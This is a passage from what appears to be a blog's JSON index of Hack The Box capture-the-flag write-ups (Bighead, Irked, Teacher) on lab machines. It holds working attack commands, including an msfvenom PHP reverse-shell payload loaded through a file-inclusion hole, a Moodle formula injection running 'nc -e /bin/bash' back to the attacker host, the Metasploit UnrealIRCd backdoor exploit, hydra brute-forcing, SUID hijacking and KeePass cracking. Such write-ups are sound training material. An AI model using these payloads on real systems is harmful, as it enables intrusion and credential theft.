.NET Framework 4.5.2 (KB4457019)             1 Update for Microsoft .NET Framework 4.5.2 (KB4457038)             1 Update for Microsoft .NET Framework 4.5.2 (KB4459945)             1 VMware Tools                                                      10.1.15.6677369 XAMPP                                                             5.6.36-0A local service is also listening on port 2020:C:\\nginx&gt;netstat -annetstat -anActive Connections  Proto  Local Address          Foreign Address        State  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING  TCP    0.0.0.0:2020           0.0.0.0:0              LISTENINGTo access it remotely we can use the portfwd command within meterpreter:meterpreter &gt; portfwd add -l 2020 -p 2020 -r 127.0.0.1[*] Local TCP relay created: :2020 &lt;-&gt; 127.0.0.1:2020It‚Äôs some kind of SSH server: Bitvise SSH Server (WinSSHD)# nc -nv 127.0.0.1 2020Ncat: Version 7.70 ( https://nmap.org/ncat )Ncat: Connected to 127.0.0.1:2020.SSH-2.0-7.44 FlowSsh: Bitvise SSH Server (WinSSHD) 7.44: free only for personal non-commercial useI don‚Äôt have the credentials so I looked for a while in the registry and eventually found a needle in the haystack.meterpreter &gt; search -f *nginx*Found 14 results...    c:\\nginx\\nginx.exe (3115008 bytes)    c:\\nginx\\conf\\nginx-orig.conf (2773 bytes)    c:\\nginx\\conf\\nginx.conf (6608 bytes)    c:\\nginx\\conf\\nginx.conf_bkp (4525 bytes)    c:\\nginx\\contrib\\geo2nginx.pl (1272 bytes)    c:\\nginx\\contrib\\unicode2nginx\\unicode-to-nginx.pl (1090 bytes)    c:\\nginx\\contrib\\vim\\ftdetect\\nginx.vim (198 bytes)    c:\\nginx\\contrib\\vim\\ftplugin\\nginx.vim (29 bytes)    c:\\nginx\\contrib\\vim\\indent\\nginx.vim (250 bytes)    c:\\nginx\\contrib\\vim\\syntax\\nginx.vim (125645 bytes)    c:\\nginx\\logs\\nginx.pid (6 bytes)    c:\\ProgramData\\Microsoft\\User Account Pictures\\nginx.dat    c:\\Users\\All Users\\Microsoft\\User Account Pictures\\nginx.dat    c:\\Windows\\System32\\nginx.reg (4268 bytes)The nginx.reg stands out:C:\\users\\nelson&gt;type c:\\Windows\\System32\\nginx.regtype c:\\Windows\\System32\\nginx.regWindows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\nginx]\"Type\"=dword:00000010\"Start\"=dword:00000002\"ErrorControl\"=dword:00000001\"ImagePath\"=hex(2):43,00,3a,00,5c,00,50,00,72,00,6f,00,67,00,72,00,61,00,6d,00,\\  20,00,46,00,69,00,6c,00,65,00,73,00,5c,00,6e,00,73,00,73,00,6d,00,5c,00,77,\\  00,69,00,6e,00,33,00,32,00,5c,00,6e,00,73,00,73,00,6d,00,2e,00,65,00,78,00,\\  65,00,00,00\"DisplayName\"=\"Nginx\"\"ObjectName\"=\".\\\\nginx\"\"Description\"=\"Nginx web server and proxy.\"\"DelayedAutostart\"=dword:00000000\"FailureActionsOnNonCrashFailures\"=dword:00000001\"FailureActions\"=hex:00,00,00,00,00,00,00,00,00,00,00,00,03,00,00,00,14,00,00,\\  00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00\"Authenticate\"=hex:48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00\"PasswordHash\"=\"336d72676e6333205361797a205472794861726465722e2e2e203b440a\"[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\nginx\\Parameters]\"Application\"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6e,\\  00,67,00,69,00,6e,00,78,00,2e,00,65,00,78,00,65,00,00,00\"AppParameters\"=hex(2):00,00\"AppDirectory\"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,00,00\"AppStdin\"=hex(2):73,00,74,00,61,00,72,00,74,00,20,00,6e,00,67,00,69,00,6e,00,\\  78,00,00,00\"AppStdout\"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6c,00,\\  6f,00,67,00,73,00,5c,00,73,00,65,00,72,00,76,00,69,00,63,00,65,00,2e,00,6f,\\  00,75,00,74,00,2e,00,6c,00,6f,00,67,00,00,00\"AppStderr\"=hex(2):43,00,3a,00,5c,00,6e,00,67,00,69,00,6e,00,78,00,5c,00,6c,00,\\  6f,00,67,00,73,00,5c,00,65,00,72,00,72,00,6f,00,72,00,2e,00,6c,00,6f,00,67,\\  00,00,00[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\nginx\\Parameters\\AppExit]@=\"Restart\"[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\nginx\\Enum]\"0\"=\"Root\\\\LEGACY_NGINX\\\\0000\"\"Count\"=dword:00000001\"NextInstance\"=dword:00000001The Authenticate key contains: 48,00,37,00,33,00,42,00,70,00,55,00,59,00,32,00,55,00,71,00,39,00,55,00,2d,00,59,00,75,00,67,00,79,00,74,00,35,00,46,00,59,00,55,00,62,00,59,00,30,00,2d,00,55,00,38,00,37,00,74,00,38,00,37,00,00,00,00,00I like using Cyberchef to decode and convert data, it‚Äôs much faster to try different filters/conversion than coding it in python.Password: H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87I can now SSH in with user nginx but I‚Äôm stuck in some sort of limited shell:# ssh -p 2020 nginx@127.0.0.1nginx@127.0.0.1's password: --&gt; `H73BpUY2Uq9U-Yugyt5FYUbY0-U87t87`bvshell:/$ whoamiwhoami: Command not found.bvshell:/$ pwd/bvshell:/$ lsanonymous             apache                apache_start.bat      apache_stop.bat       apps                  catalina_service.bat  catalina_start.bat    catalina_stop.bat     cgi-bincontrib               ctlscript.bat         FileZillaFTP          filezilla_setup.bat   filezilla_start.bat   filezilla_stop.bat    htdocs                img                   installlicenses              locale                mailoutput            mailtodisk            MercuryMail           mercury_start.bat     mercury_stop.bat      mysql                 mysql_start.batmysql_stop.bat        nginx.exe             passwords.txt         perl                  php                   phpMyAdmin            properties.ini        readme_de.txt         readme_en.txtRELEASENOTES          sendmail              service.exe           setup_xampp.bat       src                   test_php.bat          tmp                   tomcat                uninstall.datuninstall.exe         user.txt              webalizer             webdav                xampp-control.exe     xampp-control.ini     xampp-control.log     xampp_shell.bat       xampp_start.exexampp_stop.exeI checked out the Bitvise website for information on bvshell and saw that it‚Äôs some kind of chroot jail:That would explain why the above directory listing of the root directory shows the content of xampp and not the root of the Windows server.There‚Äôs a user.txt file in the directory but I can‚Äôt seem to read it.bvshell:/$ cat user.txt-bvshell: Reading binary file as a text.Local File IncludeThe Testlink application is located in /apps/testlink/htdocs.The linkto.php file contains an LFI, the important code is shown below:// alpha 0.0.1 implementation of our new pipercoin authentication tech// full API not done yet. just submit tokens with requests for now.if(isset($_POST['PiperID'])){$PiperCoinAuth = $_POST['PiperCoinID']; //plugins/ppiper/pipercoin.php        $PiperCoinSess = base64_decode($PiperCoinAuth);\t\t\t\t$PiperCoinAvitar = (string)$PiperCoinSess;}[...]  require_once($PiperCoinAuth); When I do a GET request on linkto.php, I get the following error message:Fatal error: require_once(): Failed opening required '' (include_path='C:\\xampp\\php\\PEAR;.;C:\\xampp\\apps\\testlink\\htdocs\\lib\\functions\\;C:\\xampp\\apps\\testlink\\htdocs\\lib\\issuetrackerintegration\\;C:\\xampp\\apps\\testlink\\htdocs\\lib\\codetrackerintegration\\;C:\\xampp\\apps\\testlink\\htdocs\\lib\\reqmgrsystemintegration\\;C:\\xampp\\apps\\testlink\\htdocs\\third_party\\') in C:\\xampp\\apps\\testlink\\htdocs\\linkto.php on line 62The linkto.php has a require_once($PiperCoinAuth) command, and because $PiperCoinAuth is under direct control of users through the POST PiperCoinID parameter, we can include any arbitrary PHP file.I generated a PHP meterpreter payload.# msfvenom -p php/meterpreter/reverse_tcp -o met.php LHOST=10.10.14.23 LPORT=4444[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload[-] No arch selected, selecting arch: php from the payloadNo encoder or badchars specified, outputting raw payloadPayload size: 1112 bytesSaved as: met.phpThen sent a POST request to execute PHP code through my SMB server# curl -XPOST --data \"PiperID=1&amp;PiperCoinID=\\\\\\\\10.10.14.23\\share\\met.php\" http://code.bighead.htb/testlink/linkto.phpFinally, I get a proper shell as SYSTEM on the target systemmsf5 exploit(multi/handler) &gt; [*] Encoded stage with php/base64[*] Sending encoded stage (51106 bytes) to 10.10.10.112[*] Meterpreter session 4 opened (10.10.14.23:4444 -&gt; 10.10.10.112:49159) at 2019-05-02 21:06:18 -0400msf5 exploit(multi/handler) &gt; sessions 4[*] Starting interaction with 4...meterpreter &gt; getuidServer username: SYSTEM (0)Got user flag:meterpreter &gt; cat /users/nginx/desktop/user.txt5f158a...Getting root.txt from KeepassThe root.txt is yet another troll:meterpreter &gt; cat /users/administrator/desktop/root.txt                    * * *              Gilfoyle's Prayer     ___________________6666666___________________ ____________66666__________66666_____________ _________6666___________________666__________ _______666__6____________________6_666_______ _____666_____66_______________666____66______ ____66_______66666_________66666______666____ ___66_________6___66_____66___66_______666___ __66__________66____6666_____66_________666__ _666___________66__666_66___66___________66__ _66____________6666_______6666___________666_ _66___________6666_________6666__________666_ _66________666_________________666_______666_ _66_____666______66_______66______666____666_ _666__666666666666666666666666666666666__66__ __66_______________6____66______________666__ ___66______________66___66_____________666___ ____66______________6__66_____________666____ _______666___________666___________666_______ _________6666_________6_________666__________ ____________66666_____6____66666_____________ ___________________6666666________________   Prayer for The Praise of Satan's Kingdom              Praise, Hail Satan!   Glory be to Satan the Father of the Earth       and to Lucifer our guiding light    and to Belial who walks between worlds     and to Lilith the queen of the night    As it was in the void of the beginning                   Is now, and ever shall be, Satan's kingdom without End                so it is done.                    * * *When I started a shell my PHP meterpreter kept dropping so I used the multi/manage/upload_exec metasploit module to upload an .exe meterpreter and get another meterpreter session. This time I could spawn a shell without losing access.msf5 post(multi/manage/upload_exec) &gt; run[*] Uploading /root/htb/bighead/met.exe to met.exe[*] Executing command: met.exe[*] Encoded stage with x86/shikata_ga_nai[*] Sending encoded stage (179808 bytes) to 10.10.10.112[*] Meterpreter session 7 opened (10.10.14.23:5555 -&gt; 10.10.10.112:49167) at 2019-05-02 21:19:51 -0400meterpreter &gt; shellProcess 3316 created.Channel 1 created.Microsoft Windows [Version 6.0.6002]Copyright (c) 2006 Microsoft Corporation.  All rights reserved.C:\\xampp\\apps\\testlink\\htdocs&gt;whoamiwhoamint authority\\systemThe administrator‚Äôs C:\\Users\\Administrator\\AppData\\Roaming\\KeePass directory contains a Keepass configuration file: keepass.config.xml. It contains the name of the last keyfile used : admin.png and the database file: root.txt. Notice that the file name is root.txt:Zone.Identifier and not just root.txt so this means we are looking at NTFS alternate data streams here.[...]&lt;Association&gt;&lt;DatabasePath&gt;..\\..\\Users\\Administrator\\Desktop\\root.txt:Zone.Identifier&lt;/DatabasePath&gt;&lt;Password&gt;true&lt;/Password&gt;&lt;KeyFilePath&gt;..\\..\\Users\\Administrator\\Pictures\\admin.png&lt;/KeyFilePath&gt;&lt;/Association&gt;[...]We can check this by doing dir /r in the Desktop folder and we can see:C:\\Users\\Administrator\\Desktop&gt;dir /ahdir /ah Volume in drive C has no label. Volume Serial Number is 7882-4E78 Directory of C:\\Users\\Administrator\\Desktop06/10/2018  14:33             1,519 root.txt               1 File(s)          1,519 bytes               0 Dir(s)  16,316,542,976 bytes freeC:\\Users\\Administrator\\Desktop&gt;dir /r /ahdir /r /ah Volume in drive C has no label. Volume Serial Number is 7882-4E78 Directory of C:\\Users\\Administrator\\Desktop06/10/2018  14:33             1,519 root.txt                              7,294 root.txt:Zone.Identifier:$DATA               1 File(s)          1,519 bytes               0 Dir(s)  16,316,542,976 bytes freeBecause the box only has powershell version 2, I can‚Äôt use the -stream flag to extract the ADS. But I found by pure luck that copying the file over SMB will automatically extract the data stream and create two files on my VM:C:\\Users\\Administrator\\Desktop&gt;attrib -h root.txtC:\\Users\\Administrator\\Desktop&gt;copy root.txt \\\\10.10.14.23\\share        1 file(s) copied.[...]-rwxr-xr-x  1 root root   1519 Dec 31  1969 root.txt-rwxr-xr-x  1 root root   7294 Oct  6 10:33 root.txt:Zone.IdentifierI also copied the keyfile admin.png, then renamed root.txt:Zone.Identifier file to a .kdbx extension:C:\\Users\\Administrator\\Desktop&gt;copy ..\\pictures\\admin.png \\\\10.10.14.23\\sharecopy ..\\pictures\\admin.png \\\\10.10.14.23\\share        1 file(s) copied.# file root.kdbx root.kdbx: Keepass password database 2.x KDBXWhen I tried to use keepass2john it didn‚Äôt work and just aborted without extracting the hash:# keepass2john -k admin.png root.kdbxadmin.pngAbortedKeepass uses the sha256 hash of the keyfile mixed with the password to produce the hash. In this case though the keyfile results in a hash that starts with a null byte so that seems to create a problem with keepass2john:# sha256sum admin.png 0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39  admin.pngThe fix was to just upgrade John to the latest version and I was able to get the hash after:# keepass2john -k admin.png root.kdbx root:$keepass$*2*1*0*ea5626a6904620cad648168ef3f1968766f0b5f527c9a8028c1c1b03f2490449*cb3114b5089ffddbb3d607e490176e5e8da3022fc899fad5f317f1e4ebf4c268*a0b68d67dca93aee8f9804c28dac5995*afd02b46e630ff764adb50b7a2aae99d8961b1ab4676aff41c21dca19550c9ac*43c6588d17bceedbd00ed20d5ea310b82170252e29331671cc8aea3edd094ef6*1*64*0063c12d1bf2ac03fb677e1915d1e96e3ab2cb7e381a186e58e8a06c5a296f39Then it didn‚Äôt take long to crack the password: darkness# john -w=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])Cost 1 (iteration count) is 1 for all loaded hashesCost 2 (version) is 2 for all loaded hashesCost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashesWill run 4 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusdarkness         (root)1g 0:00:00:00 DONE (2019-05-02 21:35) 100.0g/s 73600p/s 73600c/s 73600C/s dreamer..raquelUse the \"--show\" option to display all of the cracked passwords reliablySession completedI used kpcli to open the KeePass database and found the root.txt hash inside.# kpcli --key admin.png --kdb root.kdbxPlease provide the master password: *************************KeePass CLI (kpcli) v3.1 is ready for operation.Type 'help' for a description of available commands.Type 'help &lt;command&gt;' for details on individual commands.kpcli:/&gt; ls=== Groups ===chest/kpcli:/&gt; ls chest=== Groups ===hash/kpcli:/&gt; ls chest/hash=== Entries ===1. root.txtkpcli:/&gt; show -f 0Title: root.txtUname: Gilfoyle Pass: 436b83...  URL: Notes: HTB FTW!"
  },
  
  {
    "title": "Irked - Hack The Box",
    "url": "/posts/htb-writeup-irked/",
    "categories": "hackthebox, infosec",
    "tags": "ctf, stego, cve, metasploit, suid",
    "date": "2019-04-27 00:00:00 +0800",
    





    
    "snippet": "Irked is an easy box running a backdoored UnrealIRC installation. I used a Metasploit module to get a shell then ran steghide to obtain the SSH credentials for the low privileged user then got root...",
    "content": "Irked is an easy box running a backdoored UnrealIRC installation. I used a Metasploit module to get a shell then ran steghide to obtain the SSH credentials for the low privileged user then got root by exploiting a vulnerable SUID binary.Tools/Exploits/CVEs used  steghide  metasploitSummary  UnrealIRCd MSF exploit for initial foothold  steghide encoded file containing password for user  SUID binary for priv escNmapAside from the typical Apache and OpenSSH services, I noticed that UnrealIRCd is installed.# nmap -p- -sC -sV 10.10.10.117Starting Nmap 7.70 ( https://nmap.org ) at 2018-11-17 14:02 ESTNmap scan report for 10.10.10.117Host is up (0.019s latency).Not shown: 65528 closed portsPORT      STATE SERVICE VERSION22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: |   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)80/tcp    open  http    Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Site doesn't have a title (text/html).111/tcp   open  rpcbind 2-4 (RPC #100000)| rpcinfo: |   program version   port/proto  service|   100000  2,3,4        111/tcp  rpcbind|   100000  2,3,4        111/udp  rpcbind|   100024  1          33436/udp  status|_  100024  1          50397/tcp  status6697/tcp  open  irc     UnrealIRCd8067/tcp  open  irc     UnrealIRCd50397/tcp open  status  1 (RPC #100024)65534/tcp open  irc     UnrealIRCdService Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernelWebpageThe main page just has a picture and a note about IRC.UnrealIRCd exploitationThe box is running UnrealIRCd and searchsploit shows there‚Äôs an MSF exploit for it:root@ragingunicorn:~/Downloads# searchsploit unrealircUnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)Getting a shell with Metasploit is easy:msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; show optionsModule options (exploit/unix/irc/unreal_ircd_3281_backdoor):   Name    Current Setting  Required  Description   ----    ---------------  --------  -----------   RHOSTS  10.10.10.117     yes       The target address range or CIDR identifier   RPORT   8067             yes       The target port (TCP)Payload options (cmd/unix/reverse):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST  10.10.14.23      yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Automatic Targetmsf exploit(unix/irc/unreal_ircd_3281_backdoor) &gt; run[*] Started reverse TCP double handler on 10.10.14.23:4444 [*] 10.10.10.117:8067 - Connected to 10.10.10.117:8067...    :irked.htb NOTICE AUTH :*** Looking up your hostname...[*] 10.10.10.117:8067 - Sending backdoor command...[*] Accepted the first client connection...[*] Accepted the second client connection...[*] Command: echo O1zcz5ML2uK8OjPk;[*] Writing to socket A[*] Writing to socket B[*] Reading from sockets...[*] Reading from socket A[*] A: \"O1zcz5ML2uK8OjPk\\r\\n\"[*] Matching...[*] B is input...[*] Command shell session 1 opened (10.10.14.23:4444 -&gt; 10.10.10.117:58328) at 2018-11-17 14:08:40 -0500I have a shell as user ircd:python -c 'import pty;pty.spawn(\"/bin/bash\")'ircd@irked:~/Unreal3.2$ ididuid=1001(ircd) gid=1001(ircd) groups=1001(ircd)The djmardov user home directroy has a .backup file that contains the password for some stego encoded file:djmardov@irked:~/Documents$ ls -lals -latotal 16drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .drwxr-xr-x 18 djmardov djmardov 4096 Nov  3 04:40 ..-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup-rw-------  1 djmardov djmardov   33 May 15  2018 user.txtdjmardov@irked:~/Documents$ cat .backupcat .backupSuper elite steg backup pwUPupDOWNdownLRlrBAbaSSssPassword: UPupDOWNdownLRlrBAbaSSssSince the note mentionned stego and this box is rated as easy, I guessed that it would be an off-the-shelf tool like steghide and not some custom obfuscation. The hidden file is found in the irked.jpg image from the main page and the steg doesn‚Äôt use any passphrase.root@ragingunicorn:~/Downloads# steghide extract -sf irked.jpg Enter passphrase: wrote extracted data to \"pass.txt\".root@ragingunicorn:~/Downloads# root@ragingunicorn:~/Downloads# cat pass.txtKab6h+m+bbp2J:HGdjmardov‚Äôs password is: Kab6h+m+bbp2J:HGI can SSH in and get the user flag:djmardov@irked:~/Documents$ cat user.txtcat user.txt4a66a7...Priv escI found a suspicious SUID file: /usr/bin/viewuserdjmardov@irked:~$ find / -perm /4000 2&gt;/dev/nullfind / -perm /4000 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device/usr/lib/policykit-1/polkit-agent-helper-1/usr/lib/openssh/ssh-keysign/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper/usr/sbin/exim4/usr/sbin/pppd/usr/bin/chsh/usr/bin/procmail/usr/bin/gpasswd/usr/bin/newgrp/usr/bin/at/usr/bin/pkexec/usr/bin/X/usr/bin/passwd/usr/bin/chfn/usr/bin/viewuserWhen I execute the file, I see it runs /tmp/listusersdjmardov@irked:~$ /usr/bin/viewuserThis application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0           2018-11-17 13:54 (:0)djmardov pts/1        2018-11-17 14:19 (10.10.14.23)sh: 1: /tmp/listusers: not foundSince it‚Äôs a running as root and I have write access to tmp I can just copy /bin/sh to /tmp/listusers and gain rootdjmardov@irked:~$ cp /bin/sh /tmp/listusersdjmardov@irked:~$ /usr/bin/viewuserThis application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0           2018-11-17 13:54 (:0)djmardov pts/1        2018-11-17 14:19 (10.10.14.23)# cd /root# cat root.txt8d8e9e..."
  },
  
  {
    "title": "Teacher - Hack The Box",
    "url": "/posts/htb-writeup-teacher/",
    "categories": "hackthebox, infosec",
    "tags": "moodle, mysql, enumeration, ctf, tar, cronjob",
    "date": "2019-04-20 00:00:00 +0800",
    





    
    "snippet": "Teacher uses the Moodle Open Source Learning platform and contains a vulnerability in the math formula that gives us RCE. The credentials for the Moodle application are found in a .png file that co...",
    "content": "Teacher uses the Moodle Open Source Learning platform and contains a vulnerability in the math formula that gives us RCE. The credentials for the Moodle application are found in a .png file that contains text instead of an actual image. After getting a shell with the math formula, we find the low privilege user credentials in the MySQL database. We then escalate to root by abusing a backup script running from a cronjob as root.Tools/Exploits/CVEs used  https://blog.ripstech.com/2018/moodle-remote-code-execution/  https://github.com/StefanoDeVuono/steghideNmapOnly the HTTP port is open on this box, running the Apache webserver.# nmap -F -sC -sV 10.10.10.153Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-01 21:20 ESTNmap scan report for teacher.htb (10.10.10.153)Host is up (0.018s latency).Not shown: 99 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache/2.4.25 (Debian)|_http-title: Blackhat highschoolEnumerating the websiteThe first pass at dirbursting shows the /moodle directory, which refers to the Moodle Open Source Learning platform.# gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -u http://teacher.htb/.htaccess (Status: 403)/.htpasswd (Status: 403)/css (Status: 301)/fonts (Status: 301)/images (Status: 301)/javascript (Status: 301)/js (Status: 301)/manual (Status: 301)/moodle (Status: 301)/phpmyadmin (Status: 403)/server-status (Status: 403)=====================================================2018/12/01 14:02:42 Finished=====================================================I also spidered the host with Burp hoping to catch other stuff. I noticed that the image file 5.png wasn‚Äôt showing up with the same icon as the rest of the other files:When we browse to the gallery, we also see there‚Äôs an image missing:The source code contains the file as well as a weird javascript console message:The 5.png image file exists but isn‚Äôt a valid image:If we look at the file with Burp, we see that the file contains part of a password: Th4C00lTheacha. We can guess that the user is probably named Giovanni based on the note.Moodle enumerationThe Moodle application is running on this server, as shown below:Guest login is enabled but we don‚Äôt have access to anything useful with this account.We got a partial password from the 5.png file but we‚Äôre missing the last letter. I used the following script to generate a wordlist:f = open('pwd', 'w')for i in range (0,127):\tf.write('Th4C00lTheacha{}\\n'.format(chr(i)))Then using hydra we can bruteforce the giovanni account. We‚Äôll match on Set-Cookie as a positive response since the cookie is only set when we submit the correct credentials.# hydra -I -l giovanni -P pwd.txt 10.10.10.153 http-post-form \"/moodle/login/index.php:username=^USER^&amp;password=^PASS^:S=Set-Cookie\"Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2018-12-01 21:37:44[DATA] max 16 tasks per 1 server, overall 16 tasks, 128 login tries (l:1/p:128), ~8 tries per task[DATA] attacking http-post-form://10.10.10.153:80//moodle/login/index.php:username=^USER^&amp;password=^PASS^:S=Set-Cookie[80][http-post-form] host: 10.10.10.153   login: giovanni   password: Th4C00lTheacha#1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finished at 2018-12-01 21:38:06We found the password: Th4C00lTheacha#We can now log in to the Moodle webpage with giovanni / Th4C00lTheacha#:I googled vulnerabilities for Moodle and found a blog post about an RCE vulnerability in the Math formulas of the Quiz component. Basically, the math formula uses the PHP eval function to return the result and the input sanitization that is put in place in Moodle is not sufficient and can bypassed. Once we have RCE we can spawn a reverse shell.First we add a new quiz:Then create a question with ‚ÄòCalculated‚Äô type:We can put anything in the question name and text but for the formula we enter /*{a*/`$_GET[0]`;//{x}}The formula will execute code we put in the $_GET['0'] parameter:10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&amp;appendqnumstring=addquestion&amp;scrollpos=0&amp;id=6&amp;wizardnow=datasetitems&amp;cmid=7&amp;0=(nc -e /bin/bash 10.10.14.23 4444)This‚Äôll spawn a shell for us:# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.153] 49210iduid=33(www-data) gid=33(www-data) groups=33(www-data)python -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@teacher:/var/www/html/moodle/question$Getting access to giovanni userLike any web application with a database backend, the first thing I do once I get a shell is look for hardcoded database credentials in the PHP configuration file of the application. The Moodle configuration file contains the root account password for the MySQL database:www-data@teacher:/var/www/html/moodle$ cat config.php&lt;?php  // Moodle configuration file[...]$CFG-&gt;dbtype    = 'mariadb';$CFG-&gt;dblibrary = 'native';$CFG-&gt;dbhost    = 'localhost';$CFG-&gt;dbname    = 'moodle';$CFG-&gt;dbuser    = 'root';$CFG-&gt;dbpass    = 'Welkom1!';List of databases:MariaDB [(none)]&gt; show databases;show databases;+--------------------+| Database           |+--------------------+| information_schema || moodle             || mysql              || performance_schema || phpmyadmin         |+--------------------+The mdl_user table contains passwords:MariaDB [moodle]&gt; show tables;show tables;+----------------------------------+| Tables_in_moodle                 |+----------------------------------+...| mdl_user                         |...MariaDB [moodle]&gt; select * from mdl_user;select * from mdl_user;+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+| id   | auth   | confirmed | policyagreed | deleted | suspended | mnethostid | username    | password                                                     | idnumber | firstname  | lastname | email          | emailstop | icq | skype | yahoo | aim | msn | phone1 | phone2 | institution | department | address | city | country | lang | calendartype | theme | timezone | firstaccess | lastaccess | lastlogin  | currentlogin | lastip        | secret | picture | url | description                                                               | descriptionformat | mailformat | maildigest | maildisplay | autosubscribe | trackforums | timecreated | timemodified | trustbitmask | imagealt | lastnamephonetic | firstnamephonetic | middlename | alternatename |+------+--------+-----------+--------------+---------+-----------+------------+-------------+--------------------------------------------------------------+----------+------------+----------+----------------+-----------+-----+-------+-------+-----+-----+--------+--------+-------------+------------+---------+------+---------+------+--------------+-------+----------+-------------+------------+------------+--------------+---------------+--------+---------+-----+---------------------------------------------------------------------------+-------------------+------------+------------+-------------+---------------+-------------+-------------+--------------+--------------+----------+------------------+-------------------+------------+---------------+|    1 | manual |         1 |            0 |       0 |         0 |          1 | guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |          | Guest user |          | root@localhost |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | This user is a special user that allows read-only access to some courses. |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |   1530058999 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          ||    2 | manual |         1 |            0 |       0 |         0 |          1 | admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |          | Admin      | User     | gio@gio.nl     |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059097 | 1530059573 | 1530059097 |   1530059307 | 192.168.206.1 |        |       0 |     |                                                                           |                 1 |          1 |          0 |           1 |             1 |           0 |           0 |   1530059135 |            0 | NULL     |                  |                   |            |               ||    3 | manual |         1 |            0 |       0 |         0 |          1 | giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |          | Giovanni   | Chhatta  | Giio@gio.nl    |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |  1530059681 | 1543718703 | 1543718276 |   1543718446 | 10.10.14.23   |        |       0 |     |                                                                           |                 1 |          1 |          0 |           2 |             1 |           0 |  1530059291 |   1530059291 |            0 |          |                  |                   |            |               || 1337 | manual |         0 |            0 |       0 |         0 |          0 | Giovannibak | 7a860966115182402ed06375cf0a22af                             |          |            |          |                |         0 |     |       |       |     |     |        |        |             |            |         |      |         | en   | gregorian    |       | 99       |           0 |          0 |          0 |            0 |               |        |       0 |     | NULL                                                                      |                 1 |          1 |          0 |           2 |             1 |           0 |           0 |            0 |            0 | NULL     | NULL             | NULL              | NULL       | NULL          |rows in set (0.00 sec)The Giovannibak account hash the 7a860966115182402ed06375cf0a22af MD5 hash, which is expelled if we look it up on 